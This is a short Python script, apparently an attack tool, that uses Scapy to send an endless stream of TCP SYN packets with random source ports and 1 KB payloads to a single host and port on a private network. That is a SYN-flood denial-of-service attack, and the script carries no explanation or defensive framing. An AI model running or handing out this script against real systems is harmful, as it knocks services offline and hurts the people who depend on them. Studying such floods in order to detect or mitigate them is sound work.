from scapy.all import *
import scapy.all as scapy



target_ip = "192.168.1.13"
target_port = 42927

ip = scapy.IP(dst=target_ip)

tcp = scapy.TCP(sport=RandShort(), dport=target_port, flags="S")

raw = Raw(b"X"*1024)

p = ip / tcp / raw

send(p, loop=1, verbose=0)